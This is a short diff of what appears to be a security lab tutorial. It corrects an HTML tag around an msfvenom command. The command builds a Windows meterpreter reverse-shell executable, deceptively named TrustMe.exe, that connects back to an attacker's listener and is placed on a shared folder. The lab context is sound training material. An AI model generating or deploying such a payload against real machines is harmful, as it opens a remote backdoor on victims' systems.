@@ -34,7 +34,7 @@ Now, run the following commands to start a simple backdoor and backdoor listener
  
  <pre>sudo su -</pre>
 
-</pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR LINUX IP] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR LINUX IP] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
 
 Now, let's start the **Metasploit** Handler.  First, open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
 
